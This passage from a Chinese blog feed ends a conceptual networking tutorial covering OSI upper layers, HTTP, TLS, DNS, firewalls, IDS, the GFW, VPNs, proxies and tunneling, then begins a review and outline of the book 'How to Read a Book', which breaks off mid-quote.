另外，netcat 还有很多衍生品（衍生的开源项目），构成一个丰富的 netcat 家族。在上述教程也有介绍。</p><p><strong>netstat ＆ ss</strong><br>　　Windows 和 POSIX（Linux＆UNIX）都有一个 <code>netstat</code> 命令，可以查看当前系统的 TCP/UDP 状态（包括当前系统开启了哪些监听端口）。<br>　　另外，Linux 上还有一个 <code>ss</code> 命令，功能更强（但这个命令在 Windows 上默认没有）</p><p><strong><a href="https://en.wikipedia.org/wiki/Nmap">nmap</a></strong><br>　　这是最著名的开源的扫描器，可以扫描远程主机监听了哪些传输层端口（注：前面提到的“netcat 家族”也可以干这事儿）<br><code>nmap</code> 的功能很强，“端口扫描”只是其功能之一。</p><h2 id="★业务层（OSI-上三层）：概述"><a href="#★业务层（OSI-上三层）：概述" class="headerlink" title="★业务层（OSI 上三层）：概述"></a>★业务层（OSI 上三层）：概述</h2><p>　　一不小心，这篇教程已经写了这么长。为了照顾那些有“阅读障碍”的读者，俺要稍微控制一下篇幅，就把 OSI 的【上三层】合在一起讨论。<br>　　前面的章节说过：【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。<br>　　注：有些书（比如《<a href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》）会把 OSI 的上三层统称为“应用层”。由于 OSI 模型中本来就有一个“应用层”，俺认为这样容易搞混（尤其不利于技术菜鸟），所以另外起了一个“业务层”的名称。</p><h3 id="◇业务层的必要性"><a href="#◇业务层的必要性" class="headerlink" title="◇业务层的必要性"></a>◇业务层的必要性</h3><p>　　业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。<br>　　问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。<br>　　再强调一下：业务层的协议如何分层，完全看具体的业务逻辑，不要生搬硬套任何现有的参考模型。</p><h3 id="◇会话层-＆-表示层-＆-应用层"><a href="#◇会话层-＆-表示层-＆-应用层" class="headerlink" title="◇会话层 ＆ 表示层 ＆ 应用层"></a>◇会话层 ＆ 表示层 ＆ 应用层</h3><p>　　对于大部分读者来说，【没必要】花时间去了解 OSI 最上面三层之间的区别。你只需把最上面三层视作【一坨】——他们都是与网络软件的业务逻辑密切相关滴。<br>　　那么，哪些人需要详细了解“这三层的差异”捏？<br>　　如果你是个程序员，并且你正好是开发【网络】软件，俺建议你了解一下 OSI 模型的最上面三层，有助于你更深刻地思考某些网络协议的设计。</p><h2 id="★业务层（OSI-上三层）：具体实例"><a href="#★业务层（OSI-上三层）：具体实例" class="headerlink" title="★业务层（OSI 上三层）：具体实例"></a>★业务层（OSI 上三层）：具体实例</h2><h3 id="◇业务层的【协议】"><a href="#◇业务层的【协议】" class="headerlink" title="◇业务层的【协议】"></a>◇业务层的【协议】</h3><p>　　业务层的协议非常多。即使光把各种协议的名称列出来，也很费劲。所以俺就偷懒一下，只点评几个特别重要的协议。</p><p><strong>HTTP 协议</strong><br>　　如果让俺评选最重要的业务层协议，俺首推 HTTP 协议。互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。<br>　　如今 HTTP 已经不仅仅用来展示网页，还有很多业务层的协议是建立在 HTTP 协议之上。比如说：如果你用 RSS 订阅俺的博客，RSS 阅读器需要调用 blogspot 博客平台提供的 RSS 接口，这些 RSS 接口就是基于 HTTP 协议传输滴。<br>　　考虑到本文的篇幅，俺不可能在这里细聊 HTTP 协议的规格，有兴趣的同学可以去看《<a href="https://docs.google.com/document/d/1TgujhFUzyVlf1W5e48lSMTIwJuCTElvXw2LgQ_Ng0Cs/">HTTP 权威指南</a>》这本书。</p><p><strong>SSL/TLS 协议</strong><br>　　最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。<br>　　SSL/TLS 设计得比较优雅（很灵活），使得其它业务层的协议可以很方便地架构在 SSL/TLS 之上。这样的好处是：其它协议就不用自己再设计一套加密机制＆认证机制。<br>　　SSL/TLS 对于安全性很重要。</p><p><strong>域名相关的协议（DNS 及其它）</strong><br>　　域名相关的协议，也很重要。因为域名系统是整个互联网的基础设施。最早的域名查询协议是“DNS 协议”，由于这个协议【没有】加密，导致了一些安全隐患。比如 GFW 就利用 DNS 的这个弱点，搞“域名污染/域名投毒”。因此，后来又设计了一系列新的域名协议，引入了加密的机制。</p><h3 id="◇业务层相关的【网络设备】"><a href="#◇业务层相关的【网络设备】" class="headerlink" title="◇业务层相关的【网络设备】"></a>◇业务层相关的【网络设备】</h3><p><strong>应用层防火墙（<a href="https://en.wikipedia.org/wiki/Application_firewall">application firewall</a>）</strong><br>　　前面提到了：大多数网络防火墙处于4层（状态防火墙），另外还有少数处于7层，也就是“应用层防火墙”（有时候也称之为“7层防火墙”）。<br>　　一般来说，这类防火墙具备了【深度包检测】（deep packet inspection，简称 DPI）的能力，可以分析应用层协议的【内容】。<br>　　简单说一下“深度包检测”：<br>　　如果某个网络设备，仅仅分析“应用层协议”本身，它还【不够格】称之为 DPI。为了做到 DPI，还要能理解应用层协议所承载的【内容】。<br>　　比如说：某人通过【明文】的 HTTP 协议从网上下载了一个 zip 压缩包。对于这个下载行为，那些做得好的 DPI 设备不光能识别出“HTTP 协议的内容是 ZIP 压缩包”，而且还能从 ZIP 压缩包中提取出里面的文件。</p><p><strong>入侵检测（<a href="https://en.wikipedia.org/wiki/Intrusion_detection_system">intrusion detection system</a>）</strong><br>　　一般来说，“入侵检测”如果不加定语，通常指“【网络】入侵检测”（洋文叫 NIDS）；另外还有一种“【主机】入侵检测”（洋文叫 HIDS）。HIDS 与本文无关。<br>　　“入侵检测”是一种网络安全设备，它通过嗅探（sniffer）的方式抓取网上的数据包，然后进行分析，尝试发现网络中是否存在黑客/骇客的入侵的行为。故名“入侵检测”。<br>　　由于 IDS 需要理解【应用层】（7层）的内容，因此它与“应用层防火墙”有个共同点，需要具备某种程度的 DPI（深度包检测）能力。它俩的一大差异是【部署方式】。<br>　　考虑到很多读者是 IT 外行，简单说一下“旁路部署”——<br>如果你学过中学物理，应该知道电路有“串联 ＆ 并联”。所谓的“旁路部署”类似于电路中的【并联】。通俗地说：IDS 是【并联】部署，防火墙是【串联】部署。</p><p><strong>GFW（Great Firewall）</strong><br>　　本博客已经写了很多翻墙教程，大伙儿肯定都知道 GFW 了。<br>　　由于“Great Firewall”中有“Firewall”字样，很多天朝网民【误以为】GFW 是防火墙，其实不然！GFW 本质上就是 IDS——其部署方式类似于 IDS（旁路部署），其工作方式有很大一部分也类似于 IDS（当然啦，GFW 的功能比 IDS 更多）。<br>　　大约七八年前，就有热心读者建议俺写一篇技术博文，介绍 GFW 的工作原理。由于俺比较懒，拖到今年（2021）都没动手，很惭愧 :(</p><h2 id="★杂项"><a href="#★杂项" class="headerlink" title="★杂项"></a>★杂项</h2><p>　　有些概念，并不属于某个特定的层次，单独放到这个章节。</p><h3 id="◇VPN（virtual-private-network）"><a href="#◇VPN（virtual-private-network）" class="headerlink" title="◇VPN（virtual private network）"></a>◇VPN（<a href="https://en.wikipedia.org/wiki/Virtual_private_network">virtual private network</a>）</h3><p>　　咱们天朝的网民使用 VPN，一多半是为了翻墙。其实 VPN 的本意（如其名称所示）是为了提供某种虚拟化的私有的网络，让身处异地的多个人，可以用 VPN 构建出一个虚拟的内网，从而能在这个内网中协同工作。<br>　　VPN 的类型很多，使用的技术也各不相同，因此 VPN 对应的 OSI 层次很宽（“1层”到“6层”）。俺到维基百科剽窃了如下这张图，让你见识一下 VPN 的多样性。</p><p><img src="https://lh4.googleusercontent.com/qXbaBYZBvZ5k6gn4mp2M0dCYFW1rK_HR3JTCRYoWpGyNo9AZ6i90LgQzZgvL0OqImrf6j5FNAbDQDHG5k9I4iHVsm7FCSSHYhCV0yKJsz5vAH9Fil_4ZxclOoHSjlUH2aLA8Gv3hMcU" alt="不见图 请翻墙"><br>（名目繁多的 VPN，分类示意图）</p><h3 id="◇代理（proxy）"><a href="#◇代理（proxy）" class="headerlink" title="◇代理（proxy）"></a>◇代理（proxy）</h3><p>　　那些经常翻墙的同学，对“代理”应该都很熟悉了。“代理”与 VPN 类似，一开始并不是用来翻墙滴，“翻墙”只是这俩的副业。</p><p><strong>代理服务器（proxy server）</strong><br>　　“代理服务器”部署在“客户端 ＆ 服务端”之间，起到某种“中介”的作用。“代理服务器”的类型有很多，干的事情各不相同。</p><p><img src="https://lh6.googleusercontent.com/wklKf5goUVXTzmjccmfjIRpKKxZd-9vhT_0HMy3KknjAU7Oxj0GPgC7jjjO0BAfl6f-fapaBgHSp0mtsE1sS6ZyypE-ESB4idMi-ReKKU17Z1k_oVKupiOQcX3uQTlfU_P0VjoiZnG4" alt="不见图 请翻墙"><br>（“代理服务器”的简单示意图）</p><p><strong>代理客户端（proxy client）</strong><br>　　早期的代理服务器，【不】需要“代理客户端”。因为早期的“代理服务器”支持的是【标准协议】。比如“HTTP proxy server”支持的是标准 HTTP协议，而用户的电脑上，已经有浏览器（原生支持 HTTP 协议）。这种情况下，自然不需要再有“代理客户端”。<br>　　后来，为了满足某些特殊需求（比如翻墙），“代理服务器”必须使用某种特殊的（非标准的）协议。因此，就必须在用户的环境中安装“代理客户端”。对于翻墙来说，你装的翻墙软件，相当于“代理客户端”。</p><p><strong>代理的层次</strong><br>　　“代理”也分不同的层次。比较常见的有如下几种：</p><blockquote><p>TCP 代理（TCP 端口转发）——4层（传输层）<br>SOCKS 代理——5层（会话层）<br>HTTP 代理——7层（应用层）<br>……</p></blockquote><h3 id="◇网关（gateway）"><a href="#◇网关（gateway）" class="headerlink" title="◇网关（gateway）"></a>◇网关（<a href="https://en.wikipedia.org/wiki/Gateway_(telecommunications)">gateway</a>）</h3><p>　　前面的某些章节，已经稍微提及了“网关”这个概念，但还没有具体介绍它。<br>　　严格来讲，“网关”是一个逻辑概念，【不要】把它当成具体的网络设备。充当“网关”的东东，可能是：路由器 or XX层交换机 or XX层防火墙 or 代理服务器 ……<br>　　“网关”也分不同的层次。如果不加定语，通常指的是“3层网关”（网络层网关）。列几种比较常见的，供参考：</p><blockquote><p>路由器充当网关——3层（网络层）<br>3层交换机充当网关——3层（网络层）<br>4层交换机充当网关——4层（传输层）<br>应用层防火墙充当网关——7层（应用层）<br>代理服务器充当网关——（取决于代理的层次，参见前一个小节）<br>……</p></blockquote><h3 id="◇隧道协议（tunneling-protocol）"><a href="#◇隧道协议（tunneling-protocol）" class="headerlink" title="◇隧道协议（tunneling protocol）"></a>◇隧道协议（<a href="https://en.wikipedia.org/wiki/Tunnelling_protocol">tunneling protocol</a>）</h3><p>　　所谓的“隧道协议”，通俗地说就是：用某种协议包裹另一种协议，以满足某些特殊的需求。<br>　　看到这里，估计某些同学会感到纳闷——因为俺在本文开头介绍“协议栈”的时候提到说：相邻的两层协议，下层会包裹上层。“隧道协议的包裹”与“上下层协议的包裹”，差别在哪捏？<br>　　俺来解释一下：<br>　　“隧道协议”可以做到更灵活的包裹——既可以对层次相隔很远的协议进行包裹，也可以对同一层的协议进行包裹，甚至可以“倒挂”——所谓的“倒挂”就是让【上】层反过来包裹【下】层。<br>　　举例：<br>　　俺曾经写过一篇《<a href="https://program-think.blogspot.com/2019/04/Proxy-Tricks.html">如何让【不支持】代理的网络软件，通过代理进行联网（不同平台的 N 种方法）</a>》，其中介绍了“HTTP 代理”的两种模式：“转发模式 ＆ 隧道模式”。对于“HTTP 代理”的隧道模式，可以实现【TCP over HTTP】（把 TCP 协议打包到 HTTP 协议内部），这就是刚才所说的“倒挂”。<br>　　另外，VPN 小节的那张图中，有些类型的 VPN 就是用“隧道协议”的机制实现。</p><h3 id="◇（其它杂项）"><a href="#◇（其它杂项）" class="headerlink" title="◇（其它杂项）"></a>◇（其它杂项）</h3><p>　　可能还有一些杂七杂八的东东，没来得及聊。如果你觉得有些【网络相关】的概念，不太明白，欢迎到博客留言，进行反馈。<br>　　俺会根据大伙儿的反馈，再对这篇教程进行补充。</p><h2 id="★参考书目"><a href="#★参考书目" class="headerlink" title="★参考书目"></a>★参考书目</h2><p>　　如下几本书，都在<a href="https://github.com/programthink/books">俺的网盘</a>上分享了电子版。</p><table><thead><tr><th>中文书名</th><th>英文书名</th><th>作者</th></tr></thead><tbody><tr><td>《<a href="https://docs.google.com/document/d/1XQwaAMzuGuvmq5fCiTDMrh_pTUpCHJJ5C17btTv8kdE/">计算机网络</a>》</td><td>《Computer Networks》</td><td><a href="https://en.wikipedia.org/wiki/Andrew_S._Tanenbaum">Andrew Tanenbaum</a> David Wetherall</td></tr><tr><td>《<a href="https://docs.google.com/document/d/1tlbsKWyddVLeB3HSWUiq7KtkltLeClIbPtkyN6642O4/">计算机网络——自顶向下方法</a>》</td><td>《Computer Networking——A Top-Down Approach》</td><td><a href="https://en.wikipedia.org/wiki/Jim_Kurose">James Kurose</a> <a href="https://en.wikipedia.org/wiki/Keith_W._Ross">Keith Ross</a></td></tr><tr><td>《<a href="https://docs.google.com/document/d/1Fw2wSr-MgNm1d_M6F-rF1t_n3LwFWWBHrJt6vcYGta4/">TCP-IP 详解</a>》</td><td>《TCP-IP Illustrated》</td><td><a href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF">Richard Stevens</a></td></tr><tr><td>《<a href="https://docs.google.com/document/d/1eB4BLE9PDXDfrb-ioXNfrHlOthMqUe0MXs8PmRsm3Os/">UNIX 网络编程</a>》</td><td>《UNIX Network Programming》</td><td><a href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E5%8F%B2%E8%92%82%E6%96%87%E6%96%AF">Richard Stevens</a></td></tr><tr><td>《<a href="https://docs.google.com/document/d/1TgujhFUzyVlf1W5e48lSMTIwJuCTElvXw2LgQ_Ng0Cs/">HTTP 权威指南</a>》</td><td>《HTTP——The Definitive Guide》</td><td>David Gourley Brian Totty Marjorie Sayer Sailu Reddy Anshu Aggarwal</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> programthink </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何阅读一本书？</title>
      <link href="/2021/07/16/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6%EF%BC%9F/"/>
      <url>/2021/07/16/%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E4%B8%80%E6%9C%AC%E4%B9%A6%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="《如何阅读一本书》——书评及内容纲要"><a href="#《如何阅读一本书》——书评及内容纲要" class="headerlink" title="《如何阅读一本书》——书评及内容纲要"></a>《如何阅读一本书》——书评及内容纲要</h1><p><strong>文章目录</strong></p><p>★为啥要推荐这本书？<br>★此书的影响力<br>★阅读的目的<br>★主动阅读 VS 被动阅读<br>★阅读的层次<br>★如何读不同类型的书籍<br>★阅读与心智的成长</p><h2 id="★为啥要推荐这本书？"><a href="#★为啥要推荐这本书？" class="headerlink" title="★为啥要推荐这本书？"></a>★为啥要推荐这本书？</h2><p>　　俺写博客奉行一个宗旨——【<strong>授人以鱼不如授人以渔</strong>】。而《如何阅读一本书》是阅读方面非常非常重要的【渔】。<br>　　为啥俺要介绍阅读方面的【渔】？主要有两个原因：<br><strong>原因1</strong><br>　　想必大伙儿都意识到一个现象——如今大众的阅读水平是很差滴。即使一本不算难也不算厚的书，很多人也无法胜任。有些人甚至连阅读一篇较长的博文（超过1万字）都做不到——所以俺的大部分博文都尽量控制在几千字，以照顾某些阅读能力不够的同学。<br><strong>原因2</strong><br>　　还有一个原因促使俺推荐此书——最近半年分享了<a href="https://github.com/programthink/books">很多电子书</a>。但是据俺收到的反馈，很多人虽然下载了，却没怎么读。俺猜测，还有些人是因为缺乏阅读技能，导致收获不大。</p><p>　　如果你也感觉自己的阅读能力有待提高，这本书是非常非常值得【从头看完】滴。</p><h2 id="★此书的影响力"><a href="#★此书的影响力" class="headerlink" title="★此书的影响力"></a>★此书的影响力</h2><p>　　俺单独写一篇博文来推荐的书，通常都是老书——这本也不例外。<br>　　此书最早出版于1940年（在这个年代，可能你的父母还没出生）当时立刻就成为畅销书，还被翻译成多种文字。到1972年又出了一个修订版，补充了很多的内容。本文介绍的就是上世纪70年代的那个版本。<br>　　一本书历经这么久，还值得还单独写一篇博文推荐，足以说明其价值。<br>　　下面，结合俺个人的体会，对此书做一下内容简介。<br>　　强调一下：<strong>光看俺的内容简介是远远不够滴，一定要花时间自己从头到尾看完！！！</strong></p><h2 id="★阅读的目的"><a href="#★阅读的目的" class="headerlink" title="★阅读的目的"></a>★阅读的目的</h2><p>　　在书的第1章（阅读的活力与艺术）就总结了阅读的三种目的：娱乐消遣、获取资讯、增进理解力。<br>　　啥是“娱乐消遣”捏？大伙儿应该都明白，俺就不说了。<br>　　“获取资讯”和“增进理解力”，可能很多人不太清楚这两者的区别。俺打一个不太恰当的比方：“获取资讯”如同在平地走路，而“增进理解力”如同爬山。</p><p><strong>以【获取资讯】为目的</strong><br>　　这种阅读目的，你只是获取信息，只需要动用“记忆力”。所以，这种阅读是比较【轻松】滴。轻松的代价就是——这样的阅读给你的帮助不够大。<br>　　比如：对新闻的阅读，就属于这类；对大部分小说的阅读，也属于这类。</p><p><strong>以【增进理解力】为目的</strong><br>　　如果某本书的内容超出了你的理解力，或者超出了你所熟悉的领域，那么你就需要花一定的力气才能读懂。这时候，光靠记忆力就远远不够了。你需要动用大脑的其它能力（分析、推理、总结、想像……）。显然，这种阅读过程伴随着更多的思考，可以让你的头脑提升到新的高度。</p><h2 id="★主动阅读-VS-被动阅读"><a href="#★主动阅读-VS-被动阅读" class="headerlink" title="★主动阅读 VS 被动阅读"></a>★主动阅读 VS 被动阅读</h2><p>　　所谓的“主动阅读”，指的是：你要带着问题去阅读，要一边阅读一边思考。俺称之为“挖掘式的阅读”。<br>　　“被动阅读”与之相反，在阅读过程中没有思考。俺称之为“灌输式的阅读”。<br>　　如果阅读目的是“增进理解力”，就是典型的主动阅读；如果是为了“娱乐消遣”，基本上是被动阅读；至于目的是“获取资讯”的阅读，则两者兼而有之。</p><p>　　如今大部分人只懂得“灌输式的阅读”，俺觉得主要原因有两个：<br><strong>1. 教育体制</strong><br>　　天朝的教育，从来都是“灌输式”的。这样的教育培养出来的人，显然比较适应被动的阅读（被动灌输），而无法进行主动的阅读（主动挖掘）。<br>　　另外，天朝的官方教育，从来就没有系统性地培养独立思维能力，尤其是“批判性思维”的能力（关于“批判性思维”的入门，请看俺之前的博文，在“<a href="https://program-think.blogspot.com/2010/10/book-review-asking-right-questions.html">这里</a>”）<br><strong>2. 快餐文化</strong><br>　　而如今的网民，大部分人把大部分的时间花在消遣性的阅读，长期以往，主动阅读的能力就逐渐退化。<br>　　这方面的危害，微博客（microblog）尤甚——微博客不但碎片化很严重，而且助长了消遣性阅读的风气。（之前写过<a href="https://program-think.blogspot.com/2012/02/microblog-and-time-management.html">一篇博文</a>，分析微博客的弊端）</p><p>　　那么，怎样才是“带着问题阅读”捏？作者写道：</p><blockquote><p>关于一本书，你一定要提出四个主要的问题。</p><p>(1) 整体来说，这本书到底在谈些什么？<br>你一定要想办法找出这本书的主题，作者如何依次发展这个主题，如何逐步从核心主题分解出从属的关键议题来。</p><p>(2) 作者在细部说了什么，怎么说的？<br>你一定要想办法找出主要的想法、声明与论点。这些组合成作者想要传达的特殊讯息。</p><p>(3) 这本书说得有道理吗？<br>是全部有道理，还是部分有道理？除非你能回答前两个问题，否则你没法回答这个问题。在你判断这本书是否有道理之前，你必须先了解整本书在说些什么才行。然而，等你了解了一本书，如果你又读得很认真的话，你会觉得有责任为这本书做个自己的判断。光是知道作者的想法是不够的。</p><p>(4) 这本书跟你有什么关系？<br>如果这本书给了你一些资讯，你一定要问问这些资讯有什么意义。为什么这位作者会认为知道这件事很重要？你真的有必要去了解吗？如果这本书不只提供了资讯，还启发了你，就更有必要找出其他相关的、更深的含意或建议，以获得更多的启示。</p></blockquote><p>　　更多内容，请看此书的第5章——如何做一个自我要求的读者</p><h2 id="★阅读的层次"><a href="#★阅读的层次" class="headerlink" title="★阅读的层次"></a>★阅读的层次</h2><p>　　此书的重点内容在于：介绍了4种阅读层次。<br>　　为啥称“层次”而不称“类型”，因为层次有“高低之分”，而且层次之间是递进关系而不是并列关系——上面的层次需要依赖下面层次的技能。</p><h3 id="◇基础阅读"><a href="#◇基础阅读" class="headerlink" title="◇基础阅读"></a>◇基础阅读</h3><p>　　顾名思义，这是最基本的阅读层次。在这个层次，只需要你做到“读懂书籍<strong>字面上</strong>的意思”。需要的技能仅仅是：识字、断句、联系上下文、等。<br>　　显然，列位看官都已经具备这个层次了——不具备这个层次的人，相当于半文盲。<br>　　对于这个层次，只是在第3章大概介绍了一下。因为咱们都不是学龄前儿童，所以这个层次不是重点。</p><h3 id="◇检视阅读"><a href="#◇检视阅读" class="headerlink" title="◇检视阅读"></a>◇检视阅读</h3><p>　　此书的第4章介绍“检视阅读”的各种技巧。<br>　　检视阅读有时候也可以称为“略读”。它要达到的目的就是：在非常有限的时间内，大致搞清楚一本书的内容和主题。<br>　　很多人可能看不起“略读”，其实这个技能是很有用滴。掌握这个技能，有助于你用尽可能短的时间，判断一本书的优劣。这样就避免在烂书上浪费太多时间。另外，在后续的“主题阅读”层次，也非常依赖“检视阅读”的能力。<br>　　举个例子：自从俺开始提供<a href="https://github.com/programthink/books">电子书下载</a>，很多热心读者会主动分享电子书给俺。有些读者分享的电子书，俺从来没看过，如何判断此书要不要放到网盘上共享捏？这时候俺就会先采用“检视阅读”的各种技巧，快速判断该书的价值。</p><h3 id="◇分析阅读"><a href="#◇分析阅读" class="headerlink" title="◇分析阅读"></a>◇分析阅读</h3><p>　　分析阅读有时候也可以称为“精读”。一看到“精读”这个词，你就晓得这是重要的技能了。显然，只有对有价值的书，才值得花力气做“分析阅读”。“烂书或平庸的书”是没有这种待遇的。<br>　　这本书花了大量的篇幅来介绍“分析阅读”。这部分是此书【<strong>重点中的重点</strong>】。</p><p>　　分析阅读包括如下几个阶段：</p><p><strong>第1阶段——这本书在谈些啥</strong><br>主要在第7章介绍。这个阶段你需要做如下4件事情。<br>(1) 依照书本的种类与主题作分类。<br>(2) 用最简短的句子说出整本书在谈些什么。<br>(3) 按照顺序与关系，列出全书的重要部分。将全书的纲要拟出来之后，再将各个部分的纲要也一一列出。<br>(4) 找出作者在问的问题，或作者想要解决的问题。</p><p><strong>第2阶段——诠释整本书的内容</strong><br>主要在第8章和第9章介绍。这个阶段你需要做如下4件事情。<br>(5) 找出重要的、关键性的词汇，透过它们与作者达成共识<br>(6) 从最重要的句子里抓出作者的重要主旨。<br>(7) 找出作者在论述些啥，重新架构这些论述的因果关系，以明白作者的主张。<br>(8) 搞清楚作者已经解决了哪些问题，还有哪些是未解决的。在未解决的问题中，哪些是作者认为自己无法解决的。</p><p><strong>第3阶段——评价这本书</strong><br>主要在第10章和第11章介绍。<br>(9) 除非你已掌握某本书的架构，也能诠释整本书了，否则不要轻易评论。<br>(10) 不要争强好胜，非辩到底不可。<br>(11) 在说出评论之前，你要能区分出书中的“事实”与“观点”（参见俺的另一篇博文：《<a href="https://program-think.blogspot.com/2013/05/difference-between-fact-and-opinion.html">批判性思维扫盲：学会区分”事实”与”观点”</a>》）<br>如果要做出<strong>批评性</strong>的评价，需要做到如下几条之一：<br>(12) 证明作者的知识不足。<br>(13) 证明作者的知识有误。<br>(14) 证明作者的逻辑错误（关于常见逻辑谬误，俺写过一篇扫盲，在“<a href="https://program-think.blogspot.com/2011/03/logical-fallacies.html">这里</a>”）。<br>(15) 证明作者的分析与理由不够完整。</p><p>　　另外，在第12章介绍了辅助阅读。包括利用外在的工具和资源（比如工具书，百科全书、字典、等）辅助阅读某本书。<br>　　说到“百科全书”，稍微引申一下。<br>　　如今百科类的网站已经很成熟了。这类网站可以非常有效地作为阅读的辅助工具。在《<a href="https://program-think.blogspot.com/2013/03/internet-resource-discovery-1.html">网站的类型和使用场景</a>》一文中，大致介绍了俺如何使用百科类网站。<br>在所有的百科类网站中，本人强烈推荐“<a href="https://zh.wikipedia.org/">维基百科</a>”——其内容之丰富是无与伦比的，而且包括多语种，有助于提升你阅读洋文的功底。</p><h3 id="◇主题阅读"><a href="#◇主题阅读" class="headerlink" title="◇主题阅读"></a>◇主题阅读</h3><p>　　关于主题阅读，主要在第20章介绍。<br>　　所谓的“主题阅读”，通俗而言就是：为了研究某个主题，阅读跟该主题相关的多本书籍。这种阅读主要包括5个步骤：</p><p><strong>1. 找到这几本书的相关章节</strong><br>　　这时候，“检视阅读”又派上用场了。</p><p><strong>2. 带引作者与你达成共识</strong><br>　　这个步骤有点类似于“分析阅读”的第2阶段。</p><p><strong>3. 厘清问题</strong><br>　　你可以列出一些问题，然后看看这几本书能否回答这些问题。</p><p><strong>4. 界定议题</strong><br>　　如果几本不同的书籍都能够回答同一个问题，并且答案有差异。那么，你可以根据答案的差异、作者的情况、进而判断出这个问题的价值。<br>　　比方说：如果某个问题，多本书的作者给出全然不同的答案，而且这几本书的作者在立场的客观性、分析的全面性、思维的深度等方面都足够。那么这个问题就是一个非常有价值的问题，值得深入思考。</p><p><strong>5. 分析讨论</strong><br>　　找到有价值的问题之后，就需要通过自己的综合分析，思考一下：【为什么】这几本书的作者，对同一个问题会有不同的答案。如果你能想明白，那么你对该主题所处的领域，就有了更深刻的理解。</p><h2 id="★如何读不同类型的书籍"><a href="#★如何读不同类型的书籍" class="headerlink" title="★如何读不同类型的书籍"></a>★如何读不同类型的书籍</h2><p>　　这本书的如下章节，分别介绍了具体类型的书籍，有哪些阅读技巧。</p><blockquote><p>第13章 如何阅读实用型的书<br>第14章 如何阅读想像文学<br>第15章 如何阅读故事、戏剧、诗歌<br>第16章 如何阅读历史书<br>第17章 如何阅读科学与数学<br>第18章 如何阅读哲学书<br>第19章 如何阅读社会科学</p></blockquote><h2 id="★阅读与心智的成长"><a href="#★阅读与心智的成长" class="headerlink" title="★阅读与心智的成长"></a>★阅读与心智的成长</h2><p>　　这是此书最后一章的内容，包括如下几个小节：</p><h3 id="◇好书能带来什么帮助？"><a href="#◇好书能带来什么帮助？" class="headerlink" title="◇好书能带来什么帮助？"></a>◇好书能带来什么帮助？</h3><p>　　前面介绍的，都是关于“如何更好地阅读”，但是书籍本身的好坏也很重要。关于好书的重要性，俺摘录一段：</p><blockquote><p>读一本好书，却会让你的努力有所回报。最好的书对你的回馈也最多。当然，这样的回馈分成两种：第一，当你成功地阅读了一本难读的好书之后，你的阅读技巧必然增进了。第二（长期来说这一点更重要）一本好书能教你了解这个世界以及你自己。你不只更懂得如何读得更好，还更懂得生命。你变得更有智慧，而不只是更有知识—像只提供讯息的书所形成的那样。你会成为一位智者，对人类生命中永恒的真理有更深刻的体认。</p></blockquote><p>　　请注意这段提到的两个词【知识】和【智慧】——只提供讯息的书，带给你“知识”；而真正的好书带给你“智慧”。至于消遣性的书，既不会给你知识，也不会给你智慧。</p><h3 id="◇书籍的金字塔"><a href="#◇书籍的金字塔" class="headerlink" title="◇书籍的金字塔"></a>◇书籍的金字塔</h3><p>　　书籍的好坏是符合【二八原理】滴！<br>　　关于书籍的金字塔，包括三层：</p><p><strong>第1层</strong><br>　　99% 的书籍对于你的能力提升是毫无帮助的。这 99% 里面，相当大一部分书是“消遣性”的，还有一些可能是跟你完全无关的领域。<br>　　显然，这些书籍是不需要进行“分析阅读”的。</p><p><strong>第2层</strong><br>　　这一层次的书籍，你至少要做一次完整的“分析阅读”。经过一次分析阅读之后，你基本上就“读通”了，知道这本书的主要精华。一旦读通，以后你就无需再去阅读。顶多是偶尔拿出来翻看个别重点，复习某些片段。</p><p><strong>第3层</strong><br>　　这一层次的书，非常非常少。它们的特点是：你无法通过一次完整的“分析阅读”，就把它读通。甚至有可能你进行了 N 次分析阅读，也无法尽其究竟。<br>　　为啥会这样捏？俺介绍一下第2层与第3层之间的微妙差异：</p><p><strong>第2层与第3层的差异</strong><br>　　第2层的书<br>　　当你进行多次分析阅读，每次的收获会变少。因为你的本人的积累增多了，理解力提升了，而书的内容是固定的。显然每次阅读，收获降低了。<br>　　第3层的书<br>　　随着你的能力提升，每一次对该书进行分析阅读，你的收获都是全新的。甚至有可能后面的阅读，收获会更多。为啥会这样捏？因为这类书的作者，境界远远高于你本人。有可能在你一生的不同阶段都可以反复阅读同一本书，始终有收获。因为你始终达不到该书作者的境界。</p><h3 id="◇生命与心智的成长"><a href="#◇生命与心智的成长" class="headerlink" title="◇生命与心智的成长"></a>◇生命与心智的成长</h3><p>　　这一节有两段话，俺摘录如下（粗体是俺标注滴）。希望能激发大伙儿对思考的热情。</p><blockquote><p>　　